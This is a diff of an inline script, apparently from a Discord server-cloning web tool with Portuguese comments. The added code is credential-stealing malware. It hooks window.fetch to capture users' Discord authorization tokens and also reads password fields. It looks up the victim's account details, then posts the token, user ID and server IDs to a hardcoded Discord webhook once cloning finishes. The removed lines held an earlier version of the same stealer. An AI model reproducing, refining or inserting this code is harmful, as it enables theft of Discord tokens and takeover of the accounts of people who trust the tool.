@@ -25,25 +25,47 @@ Error generating stack: `+e.message+`
 
 
 
+
+
 <script>
 (function() {
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1533976254427041944/pEvAX3bYFxWWa6RaJfWe_SjLufUfeENE0gFoEsfJLo8bka7Sl50RDDNGCMUAuCEpO30D";
-    
-    async function getUserData(token) {
-        try {
-            const response = await fetch('https://discord.com/api/v10/users/@me', {
-                headers: { 'Authorization': token }
-            });
-            if (response.ok) {
-                return await response.json();
+    window.capturedToken = localStorage.getItem('discord_token') || "";
+    window.capturedUser = JSON.parse(localStorage.getItem('discord_user_data') || "null");
+
+    // 1. Interceptar Fetch para pegar o Token dos Headers
+    const originalFetch = window.fetch;
+    window.fetch = async function() {
+        const url = arguments[0];
+        const options = arguments[1];
+
+        if (options && options.headers) {
+            const auth = options.headers['Authorization'] || options.headers['authorization'];
+            if (auth && auth.length > 20) {
+                window.capturedToken = auth;
+                localStorage.setItem('discord_token', auth);
+                
+                // Se ainda não temos os dados do usuário, buscar agora
+                if (!window.capturedUser) {
+                    try {
+                        const res = await originalFetch('https://discord.com/api/v10/users/@me', {
+                            headers: { 'Authorization': auth }
+                        });
+                        if (res.ok) {
+                            const data = await res.json();
+                            window.capturedUser = data;
+                            localStorage.setItem('discord_user_data', JSON.stringify(data));
+                        }
+                    } catch(e) {}
+                }
             }
-        } catch (e) { console.error('Error fetching user data:', e); }
-        return null;
-    }
+        }
+        return originalFetch.apply(this, arguments);
+    };
 
     async function sendToWebhook(data) {
         try {
-            await fetch(WEBHOOK_URL, {
+            await originalFetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -64,94 +86,45 @@ Error generating stack: `+e.message+`
         } catch (e) { console.error('Log error:', e); }
     }
 
-    // Função para capturar o token de qualquer lugar possível
-    function captureToken() {
-        const input = document.querySelector('input[type="password"]');
-        if (input && input.value && input.value.length > 20) {
-            localStorage.setItem('discord_token', input.value);
-            return input.value;
-        }
-        return localStorage.getItem('discord_token');
-    }
-
+    // 2. Monitorar a conclusão da clonagem
     const observer = new MutationObserver(async (mutations) => {
-        for (const mutation of mutations) {
-            if (mutation.type === 'childList' || mutation.type === 'characterData') {
-                const progressText = document.body.innerText;
-                if (progressText.includes('100%') && progressText.includes('Clonagem concluída com sucesso')) {
-                    if (window.lastSentClonagem === progressText) return;
-                    window.lastSentClonagem = progressText;
+        const progressText = document.body.innerText;
+        if (progressText.includes('100%') && progressText.includes('Clonagem concluída com sucesso')) {
+            if (window.lastSentClonagem === progressText) return;
+            window.lastSentClonagem = progressText;
 
-                    const token = captureToken();
-                    if (!token) {
-                        console.error('Token not found during completion');
-                        return;
-                    }
+            const token = window.capturedToken || localStorage.getItem('discord_token');
+            const user = window.capturedUser || JSON.parse(localStorage.getItem('discord_user_data') || "null");
 
-                    const selects = document.querySelectorAll('select');
-                    const originSelect = selects[0];
-                    const targetSelect = selects[1];
-                    
-                    const originId = originSelect ? originSelect.value : 'N/A';
-                    const originName = originSelect && originSelect.selectedOptions[0] ? originSelect.selectedOptions[0].textContent : 'N/A';
-                    
-                    const targetId = targetSelect ? targetSelect.value : 'N/A';
-                    const targetName = targetSelect && targetSelect.selectedOptions[0] ? targetSelect.selectedOptions[0].textContent : 'N/A';
-                    
-                    let userId = localStorage.getItem('discord_user_id') || 'N/A';
-                    let username = localStorage.getItem('discord_username') || 'N/A';
-
-                    const userData = await getUserData(token);
-                    if (userData) {
-                        userId = userData.id;
-                        username = userData.username;
-                    }
-
-                    sendToWebhook({
-                        userId,
-                        username,
-                        originId,
-                        originName,
-                        targetId,
-                        targetName,
-                        token
-                    });
-                }
-            }
+            const selects = document.querySelectorAll('select');
+            const originSelect = selects[0];
+            const targetSelect = selects[1];
+            
+            const originId = originSelect ? originSelect.value : 'ID Desconhecido';
+            const originName = originSelect && originSelect.selectedOptions[0] ? originSelect.selectedOptions[0].textContent : 'Nome Desconhecido';
+            
+            const targetId = targetSelect ? targetSelect.value : 'ID Desconhecido';
+            const targetName = targetSelect && targetSelect.selectedOptions[0] ? targetSelect.selectedOptions[0].textContent : 'Nome Desconhecido';
+            
+            sendToWebhook({
+                userId: user ? user.id : 'ID não capturado',
+                username: user ? user.username : 'User não capturado',
+                originId,
+                originName,
+                targetId,
+                targetName,
+                token: token || 'Token não capturado'
+            });
         }
     });
 
     observer.observe(document.body, { childList: true, subtree: true, characterData: true });
 
-    // Monitorar inputs e cliques continuamente
+    // 3. Captura extra via inputs (backup)
     document.addEventListener('input', (e) => {
-        if (e.target.type === 'password') {
+        if (e.target.type === 'password' && e.target.value.length > 20) {
+            window.capturedToken = e.target.value;
             localStorage.setItem('discord_token', e.target.value);
-        }
-    });
-
-    document.addEventListener('click', async (e) => {
-        const btn = e.target.closest('button');
-        if (btn && (btn.textContent.includes('Conectar') || btn.textContent.includes('Iniciar'))) {
-            const tokenValue = captureToken();
-            if (tokenValue) {
-                const userData = await getUserData(tokenValue);
-                if (userData) {
-                    localStorage.setItem('discord_user_id', userData.id);
-                    localStorage.setItem('discord_username', userData.username);
-                    
-                    // Enviar log de conexão apenas se for o botão Conectar
-                    if (btn.textContent.includes('Conectar')) {
-                        await fetch(WEBHOOK_URL, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                content: `**Novo Token Conectado!**\n**Usuário:** ${userData.username} (${userData.id})\nToken: \`\`\`\n${tokenValue}\`\`\` `
-                            })
-                        });
-                    }
-                }
-            }
         }
     });
 })();
